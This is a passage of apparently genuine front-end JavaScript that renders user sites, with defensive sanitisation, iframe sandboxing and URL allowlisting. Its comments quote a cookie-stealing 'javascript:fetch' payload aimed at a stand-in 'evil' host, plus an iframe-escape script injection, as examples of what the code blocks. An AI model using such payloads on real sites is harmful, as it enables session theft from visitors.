document.addEventListener("DOMContentLoaded", async function () {
  // https://agorapages.com
  const origin = document.location.origin;

  // Published user sites live at /s/<owner>/<site>/...; everything else
  // (root marketing pages like /about.html, the dev server) is treated as
  // basePath = "". Detect by checking the actual path, not the host —
  // matching only on host previously caused root pages to compute a junk
  // basePath like "/about.html".
  let basePath = "";
  const sitePathMatch = document.location.pathname.match(/^\/s\/[^/]+\/[^/]+/);
  if (sitePathMatch) {
    basePath = sitePathMatch[0];
  }

  const pagesJson = await fetchPagesJson(origin, basePath);
  const siteJson = await fetchSiteJson(origin, basePath);
  const foldersJson = await fetchFoldersJson(origin, basePath);
  const siteName = siteJson ? siteJson.siteName : null;
  const showHistory = siteJson ? siteJson.showHistory : false;

  const wrapper = document.createElement("div");
  wrapper.className = "site-layout";

  const sidebar = createSidebar(origin, basePath, pagesJson, foldersJson);
  wrapper.appendChild(sidebar);

  const mainContent = document.createElement("div");
  mainContent.className = "site-main";
  wrapper.appendChild(mainContent);

  document.body.appendChild(wrapper);

  const hamburger = document.createElement("button");
  hamburger.className = "sidebar-hamburger";
  hamburger.innerHTML = "&#9776;";
  hamburger.addEventListener("click", function () {
    sidebar.classList.toggle("open");
    backdrop.classList.toggle("visible");
  });
  document.body.appendChild(hamburger);

  const backdrop = document.createElement("div");
  backdrop.className = "sidebar-backdrop";
  backdrop.addEventListener("click", function () {
    sidebar.classList.remove("open");
    backdrop.classList.remove("visible");
  });
  document.body.appendChild(backdrop);

  await fetchPageContent(origin, basePath, siteName, pagesJson, mainContent, foldersJson);
  decodeEmbeds(basePath);
  // Apply non-security visual fixup (max-width + aspect ratio) to every
  // iframe in the rendered body — both legacy embed-block iframes and
  // raw <iframe> tags pasted into markdown directly. Sandbox enforcement
  // happened earlier via injectIframeSandbox (pre-DOM); this only sets
  // styles, which are safe to apply post-attachment.
  applyIframeStyles(mainContent);
  decodeImages(basePath);
  createFooter(origin, basePath, showHistory);
});

function decodeImages(basePath) {
  const pList = document.getElementsByTagName("p");
  for (let i = 0; i < pList.length; i++) {
    let p = pList[i];
    // Check if the <p> contains an <img> and only <br> siblings (handles breaks: true adding <br> before images)
    const img = p.querySelector("img");
    const onlyImgAndBr = img && Array.from(p.children).every(
      ch => ch.nodeName.toLowerCase() === "img" || ch.nodeName.toLowerCase() === "br"
    ) && p.textContent.trim() === "";
    if (img && onlyImgAndBr) {
      // Remove any <br> elements before the image
      Array.from(p.querySelectorAll("br")).forEach(br => br.remove());

      p.style.textAlign = "center";
      p.parentElement.parentElement.classList.add("image-container");

      // Reconstruct image URL: /s/<owner>/<siteName>/imageFileName -> basePath/imageFileName
      const src = img.getAttribute("src");
      if (src) {
        const sitePathMatch = src.match(/^\/s\/[^/]+\/[^/]+\/(.+)$/);
        if (sitePathMatch) {
          const imageFileName = sitePathMatch[1];
          img.setAttribute("src", `${basePath}/${imageFileName}`);
        }
      }

      const caption = img.getAttribute("title");
      if (caption) {
        // Create caption element
        const captionEl = document.createElement("p");
        captionEl.className = "image-caption";
        captionEl.textContent = caption;
        // Insert caption after the paragraph containing the image
        p.parentNode.insertBefore(captionEl, p.nextSibling);
      }
    }
  }
}

// Extract YouTube video ID from various URL formats
function extractYouTubeVideoId(url) {
  // Constrain the capture to YouTube's canonical 11-char id format
  // ([A-Za-z0-9_-]{11}) so a malicious "URL" like
  // `youtu.be/X"></iframe><script>...` can't escape the iframe src
  // attribute when the result is interpolated into HTML. The loose
  // `[^&\n?#]+` capture this replaces accepted `<>"` etc. verbatim.
  const patterns = [
    /(?:youtube\.com\/watch\?v=|youtube\.com\/embed\/|youtu\.be\/|youtube\.com\/v\/|youtube\.com\/watch\?[^#]*&v=)([A-Za-z0-9_-]{11})(?![A-Za-z0-9_-])/,
    /^([A-Za-z0-9_-]{11})$/, // Just the video ID
  ];
  for (const pattern of patterns) {
    const match = (url || "").match(pattern);
    if (match && /^[A-Za-z0-9_-]{11}$/.test(match[1])) {
      return match[1];
    }
  }
  return null;
}

// Check if content is a YouTube URL
function isYouTubeUrl(content) {
  const trimmed = content.trim();
  return trimmed.includes("youtube.com") || trimmed.includes("youtu.be");
}

// Convert YouTube URL to embed iframe HTML. `sandbox` is baked into
// the tag string so it's present BEFORE the iframe enters the DOM via
// `innerHTML =` — setting sandbox post-attachment doesn't apply to the
// initial src navigation, which is the dangerous race window.
function youtubeUrlToEmbed(url) {
  const videoId = extractYouTubeVideoId(url);
  if (!videoId) {
    return null;
  }
  return `<iframe sandbox="allow-scripts allow-same-origin" width="560" height="315" src="https://www.youtube-nocookie.com/embed/${videoId}" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>`;
}

// Check if content is a SoundCloud URL
function isSoundCloudUrl(content) {
  const trimmed = content.trim();
  return trimmed.includes("soundcloud.com");
}

// Convert SoundCloud URL to embed iframe HTML. `sandbox` baked in for
// the same reason as youtubeUrlToEmbed.
function soundcloudUrlToEmbed(url) {
  const trimmedUrl = url.trim();
  // SoundCloud widget uses the URL as a parameter
  const encodedUrl = encodeURIComponent(trimmedUrl);
  return `<iframe sandbox="allow-scripts allow-same-origin" width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=${encodedUrl}&color=%23ff5500&auto_play=false&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>`;
}

// Force our enforced sandbox onto every <iframe> in an HTML string. MUST
// run BEFORE the HTML is inserted into the DOM — calling
// setAttribute("sandbox", ...) after attachment doesn't apply to the
// initial src navigation (the dangerous race window). Always overwrites
// an existing sandbox attribute so a user with edit access can't bypass
// the sandbox by writing their own permissive value (e.g. `sandbox=""`).
// The chosen value matches youtubeUrlToEmbed / soundcloudUrlToEmbed:
// `allow-scripts allow-same-origin` lets embedded players run JS and
// access their own origin's cookies, while still blocking top-navigation,
// popups, form submission, downloads, plugins, and pointer-lock.
function injectIframeSandbox(html) {
  if (typeof html !== "string") return html;
  return html.replace(/<iframe\b([^>]*)>/gi, (_match, attrs) => {
    const cleaned = attrs.replace(/\s+sandbox\s*=\s*(?:"[^"]*"|'[^']*'|[^\s>]+)/gi, "");
    return `<iframe${cleaned} sandbox="allow-scripts allow-same-origin">`;
  });
}

// Apply non-security iframe styling (max-width + aspect-ratio + center)
// after iframes are attached to the DOM. Sandbox enforcement happens
// earlier via injectIframeSandbox, so this function only touches
// presentation. `display: block` + `margin: 0 auto` centers every
// iframe — both raw <iframe> tags written directly into markdown
// (which have no surrounding container) and iframes from legacy
// `.embed-container` blocks (where the auto-margin overrides the
// container's text-align since block-level elements ignore it).
function applyIframeStyles(root) {
  if (!root) return;
  root.querySelectorAll("iframe").forEach((iframe) => {
    const w = iframe.width || 560;
    const h = iframe.height || 315;
    iframe.style.maxWidth = "90%";
    iframe.style.aspectRatio = `${w / h}`;
    iframe.style.display = "block";
    iframe.style.marginLeft = "auto";
    iframe.style.marginRight = "auto";
  });
}

function decodeEmbeds(basePath) {
  const preList = document.getElementsByTagName("pre");
  for (let i = preList.length - 1; i >= 0; i--) {
    const pre = preList[i];
    let embedContent;
    let pdfAttachment;
    let linkButtonContent;
    for (let j = 0; j < pre.children.length; j++) {
      const preChild = pre.children[j];
      if (preChild.classList.contains("language-embed")) {
        embedContent = preChild.innerText;
        break;
      }
      if (preChild.classList.contains("language-doc-attachment")) {
        pdfAttachment = preChild.innerText.trim();
        break;
      }
      if (preChild.classList.contains("language-link-button")) {
        linkButtonContent = preChild.innerText.trim();
        break;
      }
    }

    // Handle link buttons
    if (linkButtonContent) {
      // Content format: url|label
      const parts = linkButtonContent.split('|');
      const url = parts[0] || '';
      const label = parts[1] || 'Link';
      // Reject any URL whose scheme isn't on the allowlist. Without this
      // a malicious page author (or collaborator on someone else's site)
      // could plant `javascript:fetch('//evil/?'+document.cookie)` and
      // execute script in every visitor's session when they click.
      const safeUrl = isSafeButtonUrl(url) ? url : "#";
      const isExternal = safeUrl.startsWith('https://');
      const icon = isExternal ? '🌐' : '🔗';

      const buttonContainer = document.createElement("div");
      buttonContainer.classList.add("link-button-container");

      const linkButton = document.createElement("a");
      linkButton.href = safeUrl;
      linkButton.classList.add("link-button");
      if (isExternal) {
        linkButton.setAttribute("target", "_blank");
        linkButton.setAttribute("rel", "noopener noreferrer");
      }
      linkButton.innerHTML = `<span class="link-icon">${icon}</span> ${escapeHtml(label)}`;

      buttonContainer.appendChild(linkButton);
      pre.parentElement.parentElement.replaceWith(buttonContainer);
      continue;
    }

    // Handle PDF/DOCX attachments
    if (pdfAttachment) {
      const filename = pdfAttachment;
      const fileUrl = `${basePath}/${filename}`;
      const isDocx = filename.toLowerCase().endsWith('.docx');
      const icon = isDocx ? '📝' : '📄';

      const downloadContainer = document.createElement("div");
      downloadContainer.classList.add("pdf-download-container");

      const downloadButton = document.createElement("a");
      downloadButton.href = fileUrl;
      downloadButton.classList.add("pdf-download-button");
      downloadButton.setAttribute("download", filename);
      downloadButton.setAttribute("target", "_blank");
      downloadButton.innerHTML = `<span class="pdf-icon">${icon}</span> Download ${escapeHtml(filename)}`;

      downloadContainer.appendChild(downloadButton);
      pre.parentElement.parentElement.replaceWith(downloadContainer);
      continue;
    }

    if (embedContent) {
      // Legacy fenced-embed syntax (```embed\n<URL or HTML>\n```). The
      // editor no longer emits this — new content uses raw <iframe> in
      // markdown directly, sanitized + sandbox-enforced inline by the
      // body render pass. Kept here so existing published sites with
      // pre-migration content continue to render. Track in console so we
      // can see if/when this branch can be removed.
      console.warn("decodeEmbeds: legacy `language-embed` block detected — re-publish the page to convert to raw <iframe> markdown.");

      let embedHtml;
      if (isYouTubeUrl(embedContent)) {
        embedHtml = youtubeUrlToEmbed(embedContent);
        if (!embedHtml) {
          console.error("Could not parse YouTube URL: " + embedContent);
          continue;
        }
      } else if (isSoundCloudUrl(embedContent)) {
        embedHtml = soundcloudUrlToEmbed(embedContent);
      } else {
        embedHtml = embedContent;
      }

      const newDiv = document.createElement("div");
      newDiv.classList.add("embed-container");
      let sanitizedHtml = DOMPurify.sanitize(embedHtml, {
        ADD_TAGS: ["iframe"],
        ADD_ATTR: [
          "allow", "allowfullscreen", "frameborder", "referrerpolicy",
          "scrolling", "src", "width", "height", "sandbox",
        ],
        FORBID_TAGS: ["script", "style"],
        FORBID_ATTR: ["onerror", "onload"],
      });
      // Force our enforced sandbox before the iframe enters the DOM —
      // see injectIframeSandbox docs for why post-attach is too late.
      sanitizedHtml = injectIframeSandbox(sanitizedHtml);
      newDiv.innerHTML = sanitizedHtml;

      pre.parentElement.parentElement.replaceWith(newDiv);
    }
  }
}


// Remove a leading YAML frontmatter block (`---\n...\n---\n`) if present.
// Only matches when `---` is the very first line; trailing whitespace and
// either CRLF or LF line endings are accepted. Pages without frontmatter
// are returned unchanged.
function stripFrontmatter(text) {
  if (!text || typeof text !== "string") return text;
  return text.replace(/^---[ \t]*\r?\n[\s\S]*?\r?\n---[ \t]*(?:\r?\n|$)/, "");
}

async function fetchSiteJson(origin, basePath) {
  const siteJsonLink = `${origin}${basePath}/site.json`;

  const content = await fetch(siteJsonLink, {
    method: "GET",
    headers: {
      "Access-Control-Allow-Origin": "*",
      "Cache-Control": "no-cache, must-revalidate",
    },
  });
  let siteJson;
  if (content.ok) {
    siteJson = await content.json();
  } else {
    siteJson = null;
  }

  return siteJson;
}

async function fetchPagesJson(origin, basePath) {
  const pagesJsonLink = `${origin}${basePath}/pages.json`;

  const content = await fetch(pagesJsonLink, {
    method: "GET",
    headers: {
      "Access-Control-Allow-Origin": "*",
      "Cache-Control": "no-cache, must-revalidate",
    },
  });
  let pagesJson;
  if (content.ok) {
    pagesJson = await content.json();
  } else {
    pagesJson = null;
  }

  return pagesJson;
}

async function fetchWikilinksJson(origin, basePath) {
  try {
    const resp = await fetch(`${origin}${basePath}/wikilinks.json`, {
      method: "GET",
      headers: {
        "Access-Control-Allow-Origin": "*",
        "Cache-Control": "no-cache, must-revalidate",
      },
    });
    if (!resp.ok) return {};
    return await resp.json();
  } catch (e) {
    return {};
  }
}

async function fetchFoldersJson(origin, basePath) {
  try {
    const resp = await fetch(`${origin}${basePath}/folders.json`, {
      method: "GET",
      headers: {
        "Access-Control-Allow-Origin": "*",
        "Cache-Control": "no-cache, must-revalidate",
      },
    });
    if (!resp.ok) return {};
    const parsed = await resp.json();
    return parsed && typeof parsed === "object" ? parsed : {};
  } catch (e) {
    return {};
  }
}

function renderBacklinksSection(backlinksForPage, origin, basePath) {
  if (!Array.isArray(backlinksForPage) || backlinksForPage.length === 0) return null;

  const section = document.createElement("section");
  section.className = "backlinks-section";

  const heading = document.createElement("h3");
  heading.className = "backlinks-heading";
  heading.textContent = "Links to this page";
  section.appendChild(heading);

  const list = document.createElement("ul");
  list.className = "backlinks-list";

  for (const ref of backlinksForPage) {
    const li = document.createElement("li");
    li.className = "backlinks-item";
    const a = document.createElement("a");
    a.className = "backlinks-link";
    a.href = `${basePath}/${ref.fileName}`;
    a.textContent = ref.displayName || ref.fileName;
    li.appendChild(a);
    list.appendChild(li);
  }
  section.appendChild(list);

  return section;
}

function buildTreeFromPages(pagesJson, foldersJson) {
  if (!pagesJson) return [];
  const root = [];
  const folderMap = {};
  const folders = foldersJson || {};

  function folderDisplayName(folderPath, segment) {
    var meta = folders[folderPath];
    if (meta && meta.displayName) return meta.displayName;
    return (segment || "").replace(/[-_]+/g, " ");
  }

  function folderSortOrder(folderPath) {
    var meta = folders[folderPath];
    return (meta && meta.sortOrder != null) ? meta.sortOrder : null;
  }

  for (var idx = 0; idx < pagesJson.length; idx++) {
    var page = pagesJson[idx];
    if (page.sortOrder == null) page.sortOrder = idx;
    const parts = page.fileName.split("/");
    let currentLevel = root;
    let currentPath = "";

    for (let i = 0; i < parts.length - 1; i++) {
      currentPath = currentPath ? currentPath + "/" + parts[i] : parts[i];
      if (!folderMap[currentPath]) {
        const folder = {
          name: folderDisplayName(currentPath, parts[i]),
          type: "folder",
          path: currentPath,
          sortOrder: folderSortOrder(currentPath),
          children: [],
        };
        folderMap[currentPath] = folder;
        currentLevel.push(folder);
      }
      currentLevel = folderMap[currentPath].children;
    }

    currentLevel.push({
      name: page.displayName,
      type: "file",
      path: page.fileName,
      displayName: page.displayName,
      sortOrder: page.sortOrder != null ? page.sortOrder : null,
    });
  }

  function sortTree(nodes) {
    nodes.sort(function (a, b) {
      if (a.type !== b.type) return a.type === "folder" ? -1 : 1;
      var aOrd = a.sortOrder != null ? a.sortOrder : Infinity;
      var bOrd = b.sortOrder != null ? b.sortOrder : Infinity;
      if (aOrd !== bOrd) return aOrd - bOrd;
      return (a.name || "").localeCompare(b.name || "");
    });
    for (var i = 0; i < nodes.length; i++) {
      if (nodes[i].children) sortTree(nodes[i].children);
    }
  }
  sortTree(root);
  return root;
}

function createSidebar(origin, basePath, pagesJson, foldersJson) {
  const sidebar = document.createElement("aside");
  sidebar.className = "site-sidebar";

  const treeWrap = document.createElement("div");
  treeWrap.className = "sidebar-tree-wrap";

  const search = createSidebarSearch(origin, basePath, pagesJson, foldersJson, treeWrap);
  sidebar.appendChild(search);
  sidebar.appendChild(treeWrap);

  const tree = buildTreeFromPages(pagesJson, foldersJson);

  let currentPage = "";
  if (/^\/s\/[^/]+\/[^/]+\//.test(window.location.pathname)) {
    currentPage = window.location.pathname.split("/").slice(4).join("/").replace(".html", "");
  } else {
    currentPage = window.location.pathname.substring(1).replace(".html", "");
  }
  if (!currentPage || currentPage === "index") {
    if (pagesJson && pagesJson.length > 0) currentPage = pagesJson[0].fileName;
  }

  function renderNodes(container, nodes, depth) {
    const ul = document.createElement("ul");
    ul.className = "sidebar-tree-list";
    if (depth > 0) ul.style.paddingLeft = "16px";

    for (const node of nodes) {
      const li = document.createElement("li");
      li.className = "sidebar-tree-item";

      if (node.type === "folder") {
        const isAncestor = currentPage.startsWith(node.path + "/");
        const folderRow = document.createElement("div");
        folderRow.className = "sidebar-folder-row" + (isAncestor ? " expanded" : "");

        const arrow = document.createElement("span");
        arrow.className = "sidebar-arrow";
        arrow.textContent = isAncestor ? "▾" : "▸";

        const label = document.createElement("span");
        label.className = "sidebar-folder-label";
        label.textContent = node.name;

        const folderIcon = document.createElement("span");
        folderIcon.className = "sidebar-folder-icon";
        folderIcon.textContent = isAncestor ? "📂" : "📁";

        folderRow.appendChild(arrow);
        folderRow.appendChild(folderIcon);
        folderRow.appendChild(label);
        li.appendChild(folderRow);

        const childContainer = document.createElement("div");
        childContainer.className = "sidebar-children";
        childContainer.style.display = isAncestor ? "block" : "none";
        renderNodes(childContainer, node.children, depth + 1);
        li.appendChild(childContainer);

        folderRow.addEventListener("click", function () {
          const isExpanded = childContainer.style.display !== "none";
          childContainer.style.display = isExpanded ? "none" : "block";
          arrow.textContent = isExpanded ? "▸" : "▾";
          folderIcon.textContent = isExpanded ? "📁" : "📂";
          folderRow.classList.toggle("expanded");
        });
      } else {
        const link = document.createElement("a");
        link.className = "sidebar-page-link";
        link.href = origin + basePath + "/" + node.path + ".html";
        link.textContent = node.displayName;
        if (node.path === currentPage) {
          link.classList.add("active");
        }
        li.appendChild(link);
      }

      ul.appendChild(li);
    }
    container.appendChild(ul);
  }

  renderNodes(treeWrap, tree, 0);
  return sidebar;
}

// Slug used for heading anchors. Matches what we attach as `id` on each
// rendered heading so search results can deep-link into a page.
function slugifyHeading(text) {
  return (text || "")
    .toLocaleLowerCase()
    .trim()
    .replace(/[^\p{L}\p{N}\s-]/gu, "")
    .replace(/\s+/g, "-")
    .replace(/-+/g, "-");
}

// Sidebar search bar. Lazy-loads search-index.json on first input so the
// fetch cost only hits readers who actually search. Ranking: title match >
// H1/H2 match > deeper heading match. Empty query restores the page tree.
function createSidebarSearch(origin, basePath, pagesJson, foldersJson, treeWrap) {
  const wrap = document.createElement("div");
  wrap.className = "sidebar-search";

  const input = document.createElement("input");
  input.type = "search";
  input.className = "sidebar-search-input";
  input.placeholder = "Search pages...";
  input.setAttribute("aria-label", "Search pages");

  const resultsEl = document.createElement("div");
  resultsEl.className = "sidebar-search-results";
  resultsEl.style.display = "none";

  wrap.appendChild(input);
  wrap.appendChild(resultsEl);

  // Display-name lookup so results can show "Folder/Subfolder/Page" instead
  // of the raw slug for hits that come from search-index.json.
  const displayBySlug = new Map();
  for (const p of (pagesJson || [])) {
    if (p && p.fileName) displayBySlug.set(p.fileName, p.displayName || p.fileName);
  }

  // Folder display-name lookup, with the same fallback rules buildTreeFromPages
  // uses — prefer `folders.json` displayName, otherwise convert dashes /
  // underscores in the path segment to spaces.
  function folderSegmentName(folderPath, segment) {
    var info = (typeof foldersJson === "object" && foldersJson) ? foldersJson[folderPath] : null;
    if (info && info.displayName) return info.displayName;
    return (segment || "").replace(/[-_]+/g, " ");
  }

  // "Folder / Subfolder / Page" breadcrumb for a slug. Root-level pages
  // just return their display name.
  function breadcrumbForSlug(slug, pageDisplayName) {
    const parts = slug.split("/");
    if (parts.length === 1) return pageDisplayName || parts[0];
    const folderParts = parts.slice(0, -1);
    const folderNames = folderParts.map((seg, i) =>
      folderSegmentName(folderParts.slice(0, i + 1).join("/"), seg)
    );
    return folderNames.join(" / ") + " / " + (pageDisplayName || parts[parts.length - 1]);
  }

  let indexPromise = null;
  function getIndex() {
    if (!indexPromise) {
      indexPromise = fetch(`${origin}${basePath}/search-index.json`, {
        method: "GET",
        headers: {
          "Access-Control-Allow-Origin": "*",
          "Cache-Control": "no-cache, must-revalidate",
        },
      }).then(r => r.ok ? r.json() : { pages: {} })
        .catch(() => ({ pages: {} }));
    }
    return indexPromise;
  }

  function setHidden(hidden) {
    resultsEl.style.display = hidden ? "none" : "block";
    treeWrap.style.display = hidden ? "" : "none";
  }

  async function runSearch(qRaw) {
    const q = (qRaw || "").trim().toLocaleLowerCase();
    if (!q) {
      resultsEl.innerHTML = "";
      setHidden(true);
      return;
    }
    const index = await getIndex();
    const matches = scoreSearchHits(index, q, displayBySlug);
    // Decorate each hit with a folder-prefixed label before rendering so
    // results read as "Research / ML / Transformers" instead of just
    // "Transformers" — important when the same page name lives in
    // multiple folders.
    for (const m of matches) m.label = breadcrumbForSlug(m.slug, m.displayName);
    renderResults(resultsEl, matches, basePath, q);
    setHidden(false);
  }

  input.addEventListener("input", () => runSearch(input.value));
  input.addEventListener("keydown", (e) => {
    if (e.key === "Escape") {
      input.value = "";
      runSearch("");
      input.blur();
    }
  });

  return wrap;
}

// Score every entry in the search index against the query and return the
// top hits (max 25). Each match is one of:
//   { kind: "title",   slug, displayName, score }
//   { kind: "heading", slug, displayName, level, text, score }
// Ranking: lower score wins. title beats H1 beats H2 ... and prefix matches
// beat substring matches at the same level.
function scoreSearchHits(index, q, displayBySlug) {
  const pages = (index && index.pages) || {};
  const hits = [];
  for (const [slug, entry] of Object.entries(pages)) {
    if (!entry) continue;
    const display = displayBySlug.get(slug) || entry.displayName || slug;

    // Title match: page title (first H1) OR sidebar display name. We treat
    // both as "title" so renamed pages still surface even if their body
    // doesn't repeat the new name as an H1.
    const titleHay = ((entry.title || "") + " " + display).toLocaleLowerCase();
    const titleIdx = titleHay.indexOf(q);
    if (titleIdx >= 0) {
      hits.push({
        kind: "title",
        slug,
        displayName: display,
        score: titleIdx === 0 ? 0 : 1,
      });
      // Don't also surface heading hits when the title already matched —
      // keeps results compact.
      continue;
    }

    if (Array.isArray(entry.headings)) {
      for (const h of entry.headings) {
        const text = (h && h.t) || "";
        if (!text) continue;
        const hay = text.toLocaleLowerCase();
        const idx = hay.indexOf(q);
        if (idx < 0) continue;
        const level = (h && h.l) || 6;
        // 2 = H1 best heading score; H2 = 3, ... H6 = 7. Prefix matches
        // shave 0.5 over substring matches at the same level.
        const score = (level + 1) + (idx === 0 ? 0 : 0.5);
        hits.push({
          kind: "heading",
          slug,
          displayName: display,
          level,
          text,
          score,
        });
      }
    }
  }
  hits.sort((a, b) => {
    if (a.score !== b.score) return a.score - b.score;
    return a.displayName.localeCompare(b.displayName);
  });
  return hits.slice(0, 25);
}

function renderResults(container, hits, basePath, q) {
  container.innerHTML = "";
  if (!hits.length) {
    const empty = document.createElement("div");
    empty.className = "sidebar-search-empty";
    empty.textContent = "No matches";
    container.appendChild(empty);
    return;
  }
  for (const hit of hits) {
    const a = document.createElement("a");
    a.className = "sidebar-search-result";
    a.href = `${basePath}/${hit.slug}.html` +
      (hit.kind === "heading" ? `#${slugifyHeading(hit.text)}` : "");

    const title = document.createElement("div");
    title.className = "sidebar-search-result-title";
    title.textContent = hit.label || hit.displayName;
    a.appendChild(title);

    if (hit.kind === "heading") {
      const sub = document.createElement("div");
      sub.className = "sidebar-search-result-sub";
      sub.textContent = "› " + hit.text;
      a.appendChild(sub);
    }
    container.appendChild(a);
  }
}

async function fetchPageContent(origin, basePath, siteName, pagesJson, mainContent, foldersJson) {
  marked.setOptions({
    gfm: true,
    breaks: true,
  });

  // /s/<owner>/<site>/path/to/page.html -> path/to/page; root pages
  // (e.g. /about.html on the marketing site) -> about
  let pathName;
  if (/^\/s\/[^/]+\/[^/]+\//.test(window.location.pathname)) {
    pathName = window.location.pathname
      .split("/")
      .slice(4)
      .join("/")
      .replace(".html", "");
  } else {
    pathName = window.location.pathname.substring(1).replace(".html", "");
  }
  // If path is empty or "index", redirect to the first page in pages.json
  if (!pathName || pathName === "index") {
    if (pagesJson && pagesJson.length > 0) {
      pathName = pagesJson[0].fileName;
      console.log("Redirecting index to first page:", pathName);
    } else {
      pathName = "index"; // fallback
    }
  }

  // Set tab title
  if (pagesJson) {
    if (siteName) {
      siteName = siteName;
    } else if (
        document.location.origin.includes("agorapages.com") ||
        document.location.origin.includes("pluribus-me.pages.dev")
      ){
      // Convert site name to Title Case
      siteName = basePath.split("/")[3];
      siteName = siteName.replace(/^-*(.)|-+(.)/g, (s, c, d) =>
        c ? c.toUpperCase() : " " + d.toUpperCase()
      );
    }

    // Get page displayName from pages.json
    for (const page of pagesJson) {
      const displayName = page.displayName;
      const fileName = page.fileName;

      let relPage;
      if (fileName === pathName) {
        document.head.getElementsByTagName(
          "title"
        )[0].innerText = `${siteName} • ${displayName}`;
        break;
      }
    }
  }

  var panel = document.createElement("main");
  const errorMessage = "Could not fetch page content<br><br>O_o";
  try {
    let fetchPathName = `${origin}${basePath}/${pathName}.md`;
    const content = await fetch(fetchPathName, {
      method: "GET",
      headers: {
        "Access-Control-Allow-Origin": "*",
        "Cache-Control": "no-cache, must-revalidate",
      },
    });
    if (content.ok) {
      let text = await content.text();
      text = text.replaceAll("<br>", "");
      // Strip YAML frontmatter (a `---`-delimited block at the very top of
      // the file). Imported pages can carry frontmatter fields like `title`,
      // `date`, `tags`, etc.; we don't render those as page content.
      text = stripFrontmatter(text);
      if (typeof AgoraWikilinks !== "undefined") {
        const pages = (pagesJson || []).map(p => ({
          fileName: p.fileName,
          displayName: p.displayName,
        }));
        text = AgoraWikilinks.preprocessWikilinks(text, pages, basePath, foldersJson);
      }

      // Lazy-load KaTeX only if the page actually contains math, then
      // preprocess math expressions into placeholder tokens so marked +
      // DOMPurify don't mangle the LaTeX source.
      let mathPlaceholders = [];
      if (typeof AgoraMath !== "undefined" && AgoraMath.containsMath(text)) {
        try {
          await AgoraMath.loadKaTeX();
          const pre = AgoraMath.preprocessMath(text);
          text = pre.markdown;
          mathPlaceholders = pre.placeholders;
        } catch (e) {
          console.error("KaTeX failed to load; rendering math as raw LaTeX:", e);
        }
      }

      const parsedMarkdown = await marked.parse(text);
      // Allow <iframe> in body sanitization so users can paste raw iframe
      // HTML directly into markdown (the new embed syntax — see
      // injectIframeSandbox below). The legacy `language-embed` code-block
      // path in decodeEmbeds still works for backwards compatibility.
      let sanitizedMarkdown = DOMPurify.sanitize(parsedMarkdown, {
        ADD_TAGS: ["iframe"],
        ADD_ATTR: [
          "data-target",
          "allow", "allowfullscreen", "frameborder", "referrerpolicy",
          "scrolling", "src", "width", "height", "sandbox",
        ],
        FORBID_TAGS: ["script", "style"],
        FORBID_ATTR: ["onerror", "onload"],
      });
      // Force our enforced sandbox onto every iframe BEFORE the HTML
      // enters the DOM. Calling setAttribute("sandbox", ...) after the
      // iframe is attached doesn't apply to the initial src navigation,
      // which is the dangerous race window.
      sanitizedMarkdown = injectIframeSandbox(sanitizedMarkdown);
      if (mathPlaceholders.length > 0) {
        sanitizedMarkdown = AgoraMath.restoreMath(sanitizedMarkdown, mathPlaceholders);
      }

      const markdownSections = sanitizedMarkdown.split("<hr>");
      for (let i = 0; i < markdownSections.length; i++) {
        let section = markdownSections[i].trim();
        if (section) {
          let sectionArticle = document.createElement("article");
          sectionArticle.classList.add("h-entry");

          if (section.startsWith("<h")) {
            const hNum = section.charAt(2);
            const tempDiv = document.createElement("div");
            tempDiv.innerHTML = section;
            const header = tempDiv.querySelector("h" + hNum);
            if (header) {
              const titleText = header.textContent;
              let title = document.createElement("h" + hNum);
              title.classList.add("p-name");
              title.textContent = titleText;
              sectionArticle.appendChild(title);
              section = section
                .substring(section.indexOf("</h" + hNum + ">") + 5)
                .trim();
            }
          }

          let article = document.createElement("div");
          article.classList.add("e-content");
          article.innerHTML = section;
          sectionArticle.appendChild(article);

          panel.appendChild(sectionArticle);
        }
      }
    } else if (content.status === 404) {
      panel.innerHTML = "<h1>Page not found</h1><p>O_o</p>";
    } else {
      panel.innerHTML = errorMessage;
    }
  } catch (error) {
    console.error("Error fetching page content:", error);
    panel.innerHTML = errorMessage;
  }

  mainContent.appendChild(panel);

  // Slugified IDs on every heading so sidebar-search results (which carry
  // a `#heading-anchor`) deep-link to the right spot. Always overwrite —
  // some marked builds auto-assign their own ids using a different slug
  // algorithm, which would break the link from search-results that use
  // ours. If the URL already has a hash, scroll to it now since the
  // browser's native auto-scroll happened before the DOM was built.
  const usedIds = new Set();
  panel.querySelectorAll("h1, h2, h3, h4, h5, h6").forEach(h => {
    let base = slugifyHeading(h.textContent || "");
    if (!base) return;
    let id = base, n = 2;
    while (usedIds.has(id)) { id = `${base}-${n}`; n++; }
    usedIds.add(id);
    h.id = id;
  });
  if (window.location.hash && window.location.hash.length > 1) {
    const target = document.getElementById(decodeURIComponent(window.location.hash.slice(1)));
    if (target) target.scrollIntoView({ behavior: "instant", block: "start" });
  }

  // Append "Links to this page" section if there are any backlinks for this page
  try {
    const backlinks = await fetchWikilinksJson(origin, basePath);
    const refs = backlinks && backlinks[pathName];
    if (Array.isArray(refs) && refs.length > 0) {
      const section = renderBacklinksSection(refs, origin, basePath);
      if (section) panel.appendChild(section);
    }
  } catch (e) {
    console.error("Failed to render backlinks:", e);
  }
}

function createFooter(origin, basePath, showHistory) {
  // Create footer
  const footer = document.createElement("footer");
  footer.classList.add("pluribus-footer");

  // Powered by text
  const poweredBy = document.createElement("span");
  poweredBy.innerHTML =
    'This site is powered by <a href="https://agorapages.com" target="_blank">AgoraPages.com</a>';
  footer.appendChild(poweredBy);

  // History link (only if enabled)
  if (showHistory) {
    const historyLink = document.createElement("span");
    historyLink.classList.add("history-link");
    historyLink.textContent = "View History";
    historyLink.addEventListener("click", function () {
      showHistoryModal(origin, basePath);
    });
    footer.appendChild(historyLink);
  }

  // Theme toggle button
  const themeToggle = document.createElement("button");
  themeToggle.classList.add("theme-toggle");
  themeToggle.id = "themeToggle";
  themeToggle.innerHTML = '<span id="themeIcon">🌙</span>';
  themeToggle.addEventListener("click", toggleTheme);
  themeToggle.addEventListener("mouseenter", showThemePreview);
  themeToggle.addEventListener("mouseleave", hideThemePreview);
  footer.appendChild(themeToggle);

  document.body.appendChild(footer);

  // Create history modal overlay (hidden by default)
  const overlay = document.createElement("div");
  overlay.classList.add("history-overlay");
  overlay.id = "historyOverlay";
  overlay.innerHTML = `
        <div class="history-modal">
          <div class="history-modal-header">
            <h3>Site History</h3>
